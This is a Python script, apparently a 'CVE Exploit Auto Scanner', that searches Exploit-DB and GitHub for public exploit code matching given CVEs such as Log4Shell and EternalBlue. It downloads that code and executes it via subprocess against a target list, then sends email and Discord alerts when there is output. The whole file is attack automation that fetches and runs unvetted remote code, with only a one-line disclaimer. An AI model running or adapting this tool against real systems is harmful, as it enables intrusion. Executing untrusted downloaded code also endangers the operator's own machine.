# Disclaimer: For educational and authorized use only.

import requests
import json
import re
import os
import subprocess
import smtplib
import gzip
import shutil
import threading
from bs4 import BeautifulSoup
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ========== CONFIG ==========
CONFIG = {
    "targets": ["127.0.0.1"],  # IP/Domain để test exploit
    "email": {
        "enabled": True,
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 587,
        "username": "your_email@gmail.com",
        "password": "your_app_password",
        "from_addr": "your_email@gmail.com",
        "to_addrs": ["alert_receiver@example.com"]
    },
    "discord": {
        "enabled": True,
        "webhook_url": "https://discord.com/api/webhooks/your_webhook_here"
    },
    "nvd_bulk_url": "https://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-recent.json.gz",
    "log_file": "exploit_log.json",
    "github_token": None  # Nếu muốn tăng hạn mức API, thêm token GitHub ở đây
}
HEADERS = {'User-Agent': 'Mozilla/5.0'}

log_data = []

# ========== UTILS ==========

def send_email(subject, body):
    if not CONFIG["email"]["enabled"]:
        return
    try:
        msg = MIMEMultipart()
        msg['From'] = CONFIG["email"]["from_addr"]
        msg['To'] = ", ".join(CONFIG["email"]["to_addrs"])
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        server = smtplib.SMTP(CONFIG["email"]["smtp_server"], CONFIG["email"]["smtp_port"])
        server.starttls()
        server.login(CONFIG["email"]["username"], CONFIG["email"]["password"])
        server.sendmail(CONFIG["email"]["from_addr"], CONFIG["email"]["to_addrs"], msg.as_string())
        server.quit()
        print("[i] Email alert sent.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")

def send_discord_alert(message):
    if not CONFIG["discord"]["enabled"]:
        return
    try:
        r = requests.post(CONFIG["discord"]["webhook_url"], json={"content": message}, headers=HEADERS)
        if r.status_code == 204:
            print("[i] Discord alert sent.")
        else:
            print(f"[!] Discord alert failed: {r.status_code} {r.text}")
    except Exception as e:
        print(f"[!] Discord alert error: {e}")

def send_alert(cve_id, output):
    if output.strip():
        alert_msg = f"ALERT: Exploit for {cve_id} produced output! Possible success.\nOutput:\n{output}"
        print(alert_msg)
        send_email(f"Exploit Alert for {cve_id}", alert_msg)
        send_discord_alert(alert_msg)

def detect_extension(code):
    if code.startswith("#!/usr/bin/python") or "python" in code.lower():
        return ".py"
    if code.startswith("#!/bin/bash") or "bash" in code.lower():
        return ".sh"
    if code.startswith("#!/usr/bin/perl") or ".pl" in code.lower():
        return ".pl"
    if code.startswith("#!/usr/bin/php") or "<?php" in code.lower():
        return ".php"
    if code.startswith("#!/usr/bin/ruby") or "ruby" in code.lower():
        return ".rb"
    return ".txt"

def execute_exploit(filename, target=None):
    ext = os.path.splitext(filename)[1]
    cmd = []
    if ext == ".py":
        cmd = ["python3", filename]
    elif ext == ".sh":
        cmd = ["bash", filename]
    elif ext == ".pl":
        cmd = ["perl", filename]
    elif ext == ".php":
        cmd = ["php", filename]
    elif ext == ".rb":
        cmd = ["ruby", filename]
    else:
        print(f"[-] Unsupported file extension {ext} for execution.")
        return "Unsupported file type"

    # If target provided, try to pass it as argument/environment (best effort)
    if target:
        cmd.append(target)

    print(f"[i] Running exploit {filename} against target {target if target else 'N/A'} ...")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        output = proc.stdout + proc.stderr
        print(output)
        return output
    except Exception as e:
        print(f"[!] Execution error: {e}")
        return str(e)

# ========== Exploit-DB functions ==========

EXPLOIT_DB_SEARCH = "https://www.exploit-db.com/search"
EXPLOIT_DB_RAW = "https://www.exploit-db.com/raw"

def search_exploitdb(cve_id):
    try:
        r = requests.get(f"{EXPLOIT_DB_SEARCH}?cve={cve_id}", headers=HEADERS, timeout=15)
        soup = BeautifulSoup(r.text, "html.parser")
        rows = soup.select("table tbody tr")
        for row in rows:
            cols = row.find_all("td")
            if len(cols) > 1:
                exploit_id = cols[0].text.strip()
                title = cols[1].text.strip()
                if exploit_id.isdigit():
                    print(f"[+] Found Exploit-DB ID: {exploit_id} - {title}")
                    return exploit_id, title
        print(f"[-] No exploit found on Exploit-DB for {cve_id}.")
    except Exception as e:
        print(f"[!] Exploit-DB search error: {e}")
    return None, None

def download_exploitdb_code(exploit_id):
    try:
        r = requests.get(f"{EXPLOIT_DB_RAW}/{exploit_id}", headers=HEADERS, timeout=15)
        if r.status_code == 200:
            ext = detect_extension(r.text)
            filename = f"exploit_{exploit_id}{ext}"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(r.text)
            print(f"[+] Exploit code saved as {filename}")
            return filename
        else:
            print(f"[-] Failed to download exploit code from Exploit-DB: {r.status_code}")
    except Exception as e:
        print(f"[!] Download exploit error: {e}")
    return None

# ========== GitHub search for exploit ==========

GITHUB_API_SEARCH = "https://api.github.com/search/code"

def github_search_exploit(cve_id):
    headers = HEADERS.copy()
    if CONFIG["github_token"]:
        headers["Authorization"] = f"token {CONFIG['github_token']}"
    query = f"{cve_id} in:file language:python"
    try:
        r = requests.get(GITHUB_API_SEARCH, headers=headers, params={"q": query, "per_page": 5}, timeout=15)
        if r.status_code == 200:
            results = r.json()
            if results.get("total_count", 0) > 0:
                item = results["items"][0]
                file_url = item["html_url"]
                download_url = item["download_url"]
                print(f"[+] Found GitHub exploit: {file_url}")
                return download_url, file_url
        else:
            print(f"[-] GitHub API error: {r.status_code}")
    except Exception as e:
        print(f"[!] GitHub search error: {e}")
    return None, None

def download_github_code(download_url, filename=None):
    try:
        r = requests.get(download_url, headers=HEADERS, timeout=15)
        if r.status_code == 200:
            ext = detect_extension(r.text)
            if not filename:
                filename = f"github_exploit{ext}"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(r.text)
            print(f"[+] GitHub exploit code saved as {filename}")
            return filename
        else:
            print(f"[-] Failed to download GitHub code: {r.status_code}")
    except Exception as e:
        print(f"[!] Download GitHub code error: {e}")
    return None

# ========== NVD bulk CVE data download ==========

def download_nvd_bulk(url=CONFIG["nvd_bulk_url"], dest_file="nvd_data.json"):
    gz_file = "nvd_data.json.gz"
    try:
        print("[i] Downloading NVD bulk data (recent)... This may take some time.")
        with requests.get(url, stream=True, timeout=60) as r:
            r.raise_for_status()
            with open(gz_file, "wb") as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
        with gzip.open(gz_file, "rb") as f_in, open(dest_file, "wb") as f_out:
            shutil.copyfileobj(f_in, f_out)
        os.remove(gz_file)
        print(f"[i] NVD bulk data saved to {dest_file}")
        return dest_file
    except Exception as e:
        print(f"[!] NVD bulk download failed: {e}")
        return None

def parse_nvd_cve_description(nvd_file, cve_id):
    try:
        with open(nvd_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        for item in data.get("CVE_Items", []):
            if item["cve"]["CVE_data_meta"]["ID"].lower() == cve_id.lower():
                desc = item["cve"]["description"]["description_data"][0]["value"]
                return desc
    except Exception as e:
        print(f"[!] Parsing NVD data failed: {e}")
    return "No description found"

def detect_os_from_description(description):
    # Rất đơn giản: tìm các từ khóa OS phổ biến
    os_keywords = {
        "Windows": ["windows", "win32", "win64", "microsoft"],
        "Linux": ["linux", "ubuntu", "debian", "redhat", "centos"],
        "MacOS": ["mac os", "darwin", "macos"],
        "Android": ["android"],
        "iOS": ["ios"]
    }
    description_lower = description.lower()
    found = []
    for os_name, keywords in os_keywords.items():
        if any(kw in description_lower for kw in keywords):
            found.append(os_name)
    return ", ".join(found) if found else "Unknown"

# ========== Logging and dashboard ==========

def save_log():
    with open(CONFIG["log_file"], "w", encoding="utf-8") as f:
        json.dump(log_data, f, indent=2)
    print(f"[i] Log saved to {CONFIG['log_file']}")

def save_html_report():
    html = """<html><head><title>Exploit Report</title>
    <style>body{font-family:Arial; margin:20px;} table{border-collapse: collapse; width: 100%;} th, td{border:1px solid #ddd; padding:8px;} th{background:#f2f2f2;} </style>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    </head><body><h1>Exploit Scan Report</h1>"""
    html += f"<p>Report generated at: {datetime.now()}</p>"
    html += "<table><thead><tr><th>CVE ID</th><th>OS</th><th>Exploit Source</th><th>Target</th><th>Status</th></tr></thead><tbody>"
    success = 0
    fail = 0
    for entry in log_data:
        status = entry.get("status", "unknown")
        if status == "success":
            success += 1
        elif status == "fail":
            fail += 1
        html += f"<tr><td>{entry.get('cve')}</td><td>{entry.get('os')}</td><td>{entry.get('source')}</td><td>{entry.get('target')}</td><td>{status}</td></tr>"
    html += "</tbody></table>"

    # Chart
    html += """
    <canvas id="resultChart" width="400" height="200"></canvas>
    <script>
    const ctx = document.getElementById('resultChart').getContext('2d');
    const chart = new Chart(ctx, {
        type: 'pie',
        data: {
            labels: ['Success', 'Fail', 'Unknown'],
            datasets: [{
                label: 'Exploit Results',
                data: [%d, %d, %d],
                backgroundColor: ['#4caf50', '#f44336', '#9e9e9e']
            }]
        }
    });
    </script>
    </body></html>
    """ % (success, fail, max(0, len(log_data) - success - fail))

    with open("exploit_report.html", "w", encoding="utf-8") as f:
        f.write(html)
    print("[i] HTML report saved as exploit_report.html")

# ========== Main flow ==========

def exploit_cve(cve_id):
    print(f"\n=== Processing {cve_id} ===")
    # 1. Lấy mô tả CVE từ NVD bulk nếu có, nếu không thì gọi API NVD
    nvd_file = "nvd_data.json"
    if not os.path.isfile(nvd_file):
        print("[i] NVD bulk data not found, downloading...")
        if not download_nvd_bulk():
            print("[!] Cannot proceed without NVD data.")
            return
    description = parse_nvd_cve_description(nvd_file, cve_id)
    os_detected = detect_os_from_description(description)
    print(f"[i] Detected OS: {os_detected}")
    print(f"[i] CVE description: {description[:200]}...")

    # 2. Tìm exploit trên Exploit-DB
    exploit_id, title = search_exploitdb(cve_id)
    source = "Exploit-DB"
    filename = None
    if exploit_id:
        filename = download_exploitdb_code(exploit_id)
    else:
        # 3. Nếu không có trên Exploit-DB thì tìm trên GitHub
        print("[i] Searching exploit on GitHub...")
        dl_url, gh_url = github_search_exploit(cve_id)
        source = "GitHub"
        if dl_url:
            filename = download_github_code(dl_url)

    if not filename:
        print(f"[-] No exploit code found for {cve_id}. Skipping...")
        log_data.append({
            "cve": cve_id,
            "os": os_detected,
            "source": "None",
            "target": "N/A",
            "status": "fail",
            "desc": description
        })
        return

    # 4. Chạy exploit trên từng target
    for target in CONFIG["targets"]:
        output = execute_exploit(filename, target)
        status = "success" if output.strip() else "fail"
        log_data.append({
            "cve": cve_id,
            "os": os_detected,
            "source": source,
            "target": target,
            "status": status,
            "desc": description,
            "output": output
        })
        if status == "success":
            send_alert(cve_id, output)

def scan_cve_list(cve_list):
    threads = []
    for cve in cve_list:
        t = threading.Thread(target=exploit_cve, args=(cve,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

def main():
    print("=== CVE Exploit Auto Scanner ===")

    # Ví dụ scan nhiều CVE cùng lúc
    sample_cves = [
        "CVE-2021-44228",  # Log4Shell (chỉ ví dụ)
        "CVE-2017-0144"    # EternalBlue (chỉ ví dụ)
    ]

    scan_cve_list(sample_cves)

    save_log()
    save_html_report()

if __name__ == "__main__":
    main()
